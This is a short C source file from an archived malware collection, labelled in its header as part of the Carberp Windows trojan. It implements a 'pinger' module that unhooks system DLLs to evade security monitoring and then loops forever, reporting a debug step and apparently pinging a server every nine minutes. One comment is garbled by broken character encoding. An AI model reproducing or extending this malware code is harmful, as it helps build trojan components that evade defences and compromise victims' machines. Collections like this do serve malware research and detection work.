/*
  name      Carberp
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "GetApi.h"
#include "BotUtils.h"
#include "Unhook.h"
#include "dprint.h"
#include "DbgRpt.h"

#pragma comment(linker, "/ENTRY:PingerMain" )

int APIENTRY PingerMain()
{
	UnhookDlls();

	DebugReportInit();

	while (true)
	{
		PP_DPRINTF(L"PingerMain: pinging server...");

		//160_dp ������ ring3 �����
		DebugReportStepByName("160_dp");

		PP_DPRINTF(L"PingerMain: sleeping 9 min");
		pSleep(9 * 60 * 1000);
	}
	return 0;
}

void main(){};